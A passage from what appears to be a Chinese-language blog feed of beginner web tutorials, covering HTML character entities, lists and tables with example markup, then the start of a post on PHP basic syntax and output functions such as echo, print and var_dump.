<li><p>浏览器总是会截短 HTML 页面中的空格。<font color="#FF7F00"><strong>如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个</strong></font>，因此，要使用10个空格的话就需要写10个<code>&amp;nbsp;</code> 。（如需在页面中增加空格的数量，您需要使用 <code>&amp;nbsp;</code> 字符实体）</p>
</li>
</ul>
<br>

<p><font face="Microsoft YaHei"><strong>3. HTML 中有用的字符实体</strong></font></p>
<p><strong>注释：</strong>实体名称对大小写敏感！半角分号不要忘记！<br>如果想要输出<code>&amp;nbsp;</code>而不被转义为空格，可这样：<code>&amp;amp;nbsp;</code>，因为<code>&amp;amp;</code>对应<code>$</code>--&gt;&amp;nbsp;</p>
<table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">实体名称</th>
<th align="left">实体编号</th>
</tr>
</thead>
</table>
<pre><code> |空格    |**`&amp;nbsp;`**     |**`&amp;#160;`**
</code></pre>
<p>&lt;    |小于号    |<strong><code>&amp;lt;</code>**    |<strong><code>&amp;#60;</code></strong><br>&gt;    |大于号    |</strong><code>&amp;gt;</code>**    |<strong><code>&amp;#62;</code></strong><br>&amp;    |和号    |<strong><code>&amp;amp;</code></strong>        |<strong><code>&amp;#38;</code></strong><br>“    |引号    |<strong><code>&amp;quot;</code></strong>        |<strong><code>&amp;#34;</code></strong><br>‘    |撇号     |<strong><code>&amp;apos; </code></strong>(IE不支持)    |<strong><code>&amp;#39;</code></strong><br>￠    |分（cent）    |<strong><code>&amp;cent;</code></strong>    |<strong><code>&amp;#162;</code></strong><br>£    |镑（pound）    |<strong><code>&amp;pound;</code></strong>    |<strong><code>&amp;#163;</code></strong><br>¥    |元（yen）    |<strong><code>&amp;yen;</code></strong>    |<strong><code>&amp;#165;</code></strong><br>€    |欧元（euro）    |<strong><code>&amp;euro;</code></strong>    |<strong><code>&amp;#8364;</code></strong><br>§    |小节    |<strong><code>&amp;sect;</code></strong>    |<strong><code>&amp;#167;</code></strong><br>©    |版权（copyright）    |<strong><code>&amp;copy;</code></strong>    |<strong><code>&amp;#169;</code></strong><br>®    |注册商标    |<strong><code>&amp;reg;</code></strong>    |<strong><code>&amp;#174;</code></strong><br>™    |商标    |<strong><code>&amp;trade;</code></strong>    |<strong><code>&amp;#8482;</code></strong><br>×    |乘号    |<strong><code>&amp;times;</code></strong>    |<strong><code>&amp;#215;</code></strong><br>÷    |除号    |<strong><code>&amp;divide;</code></strong>    |<strong><code>&amp;#247;</code></strong></p>
<p>完整的实体符号参考：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/tags/html_ref_entities.html">HTML ISO-8859-1 参考手册</a>]</font> </p>
<br>

<br>

<h3 id="三-HTML-列表"><a href="#三-HTML-列表" class="headerlink" title="三. HTML 列表"></a><font color="#FF6347" face="Comic sans MS">三. HTML 列表</font></h3><p>列表就是像word里面的标题一样，顺着往下数的标题。</p>
<p>HTML 支持<font color="#FF7F00"><strong>无序列表ul</strong></font>(unordered list）、<font color="#FF7F00"><strong>有序列表ol</strong></font>（ordered list）和<font color="#FF7F00"><strong>自定义列表dl</strong></font>（definition list）</p>
<br>

<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;ul&gt;&lt;/ul&gt;</code></strong> 无序列表<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>type</code></strong> 列表项属性，放在&lt;ul type&#x3D;””&gt;里，取值有：<ul>
<li><input disabled="" type="checkbox"> <strong><code>disc</code></strong> 小黑点</li>
<li><input disabled="" type="checkbox"> <strong><code>circle</code></strong> 空心圆</li>
<li><input disabled="" type="checkbox"> <strong><code>square</code></strong> 实心方块</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;ol&gt;&lt;/ol&gt;</code></strong> 有序列表<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>type</code></strong> 编号类型，放在&lt;ol type&#x3D;””&gt;里，取值有：<ul>
<li><input disabled="" type="checkbox"> <strong><code>1</code></strong> 整数有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>a</code></strong> 字母小写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>A</code></strong> 字母大写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>i</code></strong> 罗马小写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>I</code></strong> 罗马大写有序列表</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>start</code></strong> 从第几个开始编号(数字)，放在&lt;dl type&#x3D;”” start&#x3D;””&gt;里。</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;dl&gt;&lt;/dl&gt;</code></strong> 自定义列表<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;dt&gt;&lt;/dt&gt;</code></strong> 自定义列表项<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;dd&gt;&lt;/dd&gt;</code></strong> 自定义列表项的描述</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p>列表展示如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/09/5c8320e82a362.jpg&quot;</span>&gt;</span><br><span class="line">  &lt;ol type=<span class="string">&quot;1&quot;</span> start=<span class="string">&quot;1&quot;</span>&gt;          &lt;!--有序列表开始--&gt;</span><br><span class="line">    &lt;li&gt;哈哈，这里是第一条有序列表&lt;/li&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;ul type=<span class="string">&quot;circle&quot;</span>&gt;            &lt;!--无序列表开始--&gt;</span><br><span class="line">          &lt;li&gt;这里是第一条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第二条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;                         &lt;!--无序列表结束--&gt;</span><br><span class="line">    </span><br><span class="line">     &lt;ul type=<span class="string">&quot;disc&quot;</span>&gt;</span><br><span class="line">          &lt;li&gt;这里是第三条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第四条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">  &lt;br&gt;  </span><br><span class="line">  &lt;li&gt;哈哈，这里是第二条有序列表&lt;/li&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;ul type=<span class="string">&quot;square&quot;</span>&gt;</span><br><span class="line">          &lt;li&gt;这里是第五条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第六条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;  </span><br><span class="line">  &lt;/ol&gt;                             &lt;!--有序列表结束--&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;ol type=<span class="string">&quot;a&quot;</span> start=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">     &lt;li&gt;哈哈，这里是第三条有序列表&lt;/li&gt;</span><br><span class="line">   &lt;br&gt;</span><br><span class="line">     &lt;li&gt;哈哈，这里是第四条有序列表&lt;/li&gt;</span><br><span class="line">  &lt;/ol&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;dl&gt;</span><br><span class="line">            &lt;dt&gt;我是第一个自定义列表的列表项&lt;/dt&gt;</span><br><span class="line">                &lt;dd&gt;我是第一个自定义列表的列表项的描述&lt;/dd&gt;          </span><br><span class="line">  &lt;/dl&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c832ded3bac1.png" alt="7.png"></p>
<p>可参读博文：<font color="#00B2EE">《<a href="https://www.cnblogs.com/yyhh/p/4208951.html">HTML表格与列表</a>》</font> </p>
<br>

<br>

<h3 id="四-HTML-表格"><a href="#四-HTML-表格" class="headerlink" title="四. HTML 表格"></a><font color="#FF6347" face="Comic sans MS">四. HTML 表格</font></h3><p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、表格</strong></font></p>
<p>网页中有类似word里面的功能，当然，也会有类似excel里面的功能，表格就是其中之一。</p>
<p>表格由 <code>&lt;table&gt;</code> 标签来定义。每个表格均有若干行（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干单元格（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p>
<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格的结构</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;table&gt;                         &lt;!--定义表格--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;tr&gt;                    &lt;!--定义一行--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;       &lt;!--定义一个标题单元格--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/&lt;th&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;       &lt;!--定义一个单元格--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格标签及属性</strong></font></p>
<p><strong>注：</strong>属性是区分大小写的，bgColor如果写成bgcolor是没有效果的</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;table&gt;&lt;/table&gt;</code></strong> 表，----&gt;可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>Width</code>**：表格宽度，单位可以是百分比，也可以是固定值。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Height</code>**：表格高度。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> center</li>
<li><input disabled="" type="checkbox"> right</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Border</code>**：边框粗细。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Bordercolor</code>**：边框颜色。取值：rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：表格背景色（<font color="#FF7F00">不赞成使用该属性</font>）。取值： rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>background</code>**：背景图片，取值：URL</li>
<li><input disabled="" type="checkbox"> **<code>cellpadding</code>**：单元格边线到内容间的距离(填充距离)。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>cellspacing</code><strong>：单元格与单元格之间的距离(间距)，默认是双线</strong>，这个很重要</strong><br>取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>rules</code><strong>：合并单元格边框线，取值：all。</strong>注意：</strong>rules兼容性不好，请使用CSS来取代它。</li>
<li><input disabled="" type="checkbox"> **<code>summary</code>**：摘要，使搜索引擎更好的读懂表格内容，更好的帮助特殊用户读取表格内容。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> text</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;caption&gt;&lt;/caption&gt;</code>**：定义表格标题。可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> top</li>
<li><input disabled="" type="checkbox"> rightbottom</li>
<li><input disabled="" type="checkbox"> bottom</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;tr&gt;&lt;/tr&gt;</code>**：行标记。可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：行的背景色。取值： rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>Height</code>**：行高度。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格内容对齐方式。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> center</li>
<li><input disabled="" type="checkbox"> right</li>
<li><input disabled="" type="checkbox"> justify</li>
<li><input disabled="" type="checkbox"> char</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>valign</code>**：属性趋向于垂直对齐，其值包含：top、bottom、middle、baseline</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;th&gt;&lt;/th&gt;</code>**：标题单元格（每列第一行），居中加粗显示。</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;td&gt;&lt;/td&gt;</code>**：普通单元格。<code>&lt;th&gt;</code>和<code>&lt;td&gt;</code>可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>height</code>**：单元格高度</li>
<li><input disabled="" type="checkbox"> **<code>width</code>**：单元格宽度</li>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：单元格背景色</li>
<li><input disabled="" type="checkbox"> **<code>background</code>**：单元格背景图片</li>
<li><input disabled="" type="checkbox"> **<code>align</code>**：水平对齐</li>
<li><input disabled="" type="checkbox"> **<code>valign</code>**：垂直水齐</li>
<li><input disabled="" type="checkbox"> **<code>rowspan</code>**：<font color="#FF7F00"><strong>上下单元格合并。合并属性必须放在第一个单元格中。</strong></font></li>
<li><input disabled="" type="checkbox"> **<code>colspan</code>**：<font color="#FF7F00"><strong>左右单元格合并。合并时，有增就得有减，要保证每一行单元格的个数不变。</strong></font></li>
</ul>
</li>
</ul>
<br>

<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>三、表格标签示例</strong></font></p>
<ol>
<li><code>&lt;table&gt;、&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;</code>示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;th&gt;工号&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;姓名&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;职位&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">001</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小明&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;设计师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">002</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小方&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;工程师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">003</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小白&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;程序员&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c836d74b4ebb.png" alt="8.png"></p>
<br>

<br>

<ol start="2">
<li><code>&lt;caption&gt;&lt;/caption&gt;</code>表格标题示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">         &lt;caption&gt;<span class="number">2019.3</span>月日历&lt;/caption&gt;   &lt;!--放在&lt;table&gt;&lt;/table&gt;中间--&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;th&gt;工号&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;姓名&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;职位&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">001</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小明&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;设计师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">002</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小方&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;工程师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">003</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小白&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;程序员&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c836e941fa2e.png" alt="10.png"></p>
<br>

<br>

<ol start="3">
<li>空表格、跨行或者跨列表格示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;table&gt;   &lt;!--建立空表，无属性--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">         &lt;td&gt;zdd&lt;/td&gt;</span><br><span class="line">         &lt;td&gt;<span class="number">30</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">         &lt;td&gt;ddz&lt;/td&gt;</span><br><span class="line">         &lt;td&gt;<span class="number">27</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">   &lt;/table&gt;</span><br><span class="line">  </span><br><span class="line">&lt;br&gt;         &lt;!--合并左右单元格--&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;th colspan=<span class="string">&quot;2&quot;</span>&gt;电话&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;Bill Gates&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">854</span>&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">855</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">   </span><br><span class="line">&lt;br&gt;         &lt;!--合并上下单元格--&gt;</span><br><span class="line">   &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">          cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;td&gt;Bill Gates&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th rowspan=<span class="string">&quot;2&quot;</span>&gt;电话&lt;/th&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">854</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">855</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c83737340e28.png" alt="11.png"></p>
<br>

<br>

<h3 id="五-HTML-表单"><a href="#五-HTML-表单" class="headerlink" title="五. HTML 表单"></a><font color="#FF6347" face="Comic sans MS">五. HTML 表单</font></h3><br>

<p>表单很简单，在HTML里它就是用来人与服务器的交互，或者说是HTML的输入输出交互的重要功能！</p>
<p>表单后续有时间再详细叙述吧，或者可以看在本站博文就有开始使用了….<font color="#00B2EE">《<a href="https://directoree.top/post/PHP-MySQL">PHP操作MySQL数据库</a>》</font></p>
<br />

<br />

<h3 id="六-CSS"><a href="#六-CSS" class="headerlink" title="六. CSS"></a><font color="#FF6347" face="Comic sans MS">六. CSS</font></h3><p><font color="#00B2EE">《<a href="https://directoree.github.io/post/HTML-CSS">CSS 基础</a>》</font></p>
<p>本文参考：<br><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html">html&#x2F;css快速入门</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html">HTML+CSS基础入门教程</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/24737.html">HTML极速入门(2018版)</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/5007.html">弹指间学会HTML视频教程</a>》</font></p>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础语法</title>
    <url>/post/PHP-1/</url>
    <content><![CDATA[<p>年後の新作2.14(。・∀・)ノ   </p>
<p>本文参考PHP中文网：<font color="#00B2EE">[<a href="http://www.php.cn/code/4800.html">PHP入门教程之一周学会PHP</a>]</font>&amp;emsp;<font color="#00B2EE">[<a href="http://www.php.cn/code/4760.html">PHP入门视频教程之一周学会PHP</a>]</font><br>资料查阅：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_string.asp">W3shcool PHP 教程</a>]</font><br>&amp;emsp;<br>&amp;emsp;</p>
<span id="more"></span>

<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP</font></center>




<p>&amp;emsp;</p>
<h3 id="一、-PHP基础语法"><a href="#一、-PHP基础语法" class="headerlink" title="一、 PHP基础语法"></a><font color="#FF6347" face="Comic sans MS">一、 PHP基础语法</font></h3><h4 id="1-1-PHP-语法"><a href="#1-1-PHP-语法" class="headerlink" title="1.1 PHP 语法"></a><font color="#3CB371" face="Comic sans MS">1.1 PHP 语法</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP基础语法</strong></font><br>PHP 脚本可以放在文档中的任何位置。<br>PHP 脚本以 尖括号、问号、PHP <font color="#00B2EE"><strong>&lt;?php**</font>开始，以 <font color="#00B2EE"></strong>?&gt;<strong></font> 问号、尖括号结束。<br>PHP 文件的默认文件扩展名是 “<font color="#00B2EE"></strong>.php**</font>“。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     //这里是我们要写的PHP代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><br><font color="red"><strong>2. PHP输出语法</strong></font><br>PHP中<font color="#00B2EE"><strong>echo(), print(), print_r(), var_dump()</strong></font>的区别：<br><font color="#00B2EE"><strong>echo：</strong></font>是PHP语句, 输出一个或多个字符串。实际上它并不是一个函数，所以不必对它使用括号，直接用echo就行。print和print_r是函数,语句没有返回值,函数可以有返回值(即便没有用)。可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。</p>
<p><font color="#00B2EE"><strong>print：</strong></font> 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。只能打印出简单类型变量的值，如：int、string。<br>下面的实例演示了如何使用 print 命令输出字符串（字符串可以包含 HTML 标签）：</p>
<p><font color="#00B2EE"><strong>print_r()：</strong></font><br>可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。</p>
<p><font color="#00B2EE"><strong>var_dump()：</strong></font><br>var_dump(传入一个变量) 输出变类型和值（最常用）。var_dump() 是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></font></p>
<blockquote>
<blockquote>
<p>·  echo - 可以输出一个或多个字符串<br>·  print - 只允许输出一个字符串，返回值总为 1<br>提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。<br>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p>
</blockquote>
</blockquote>
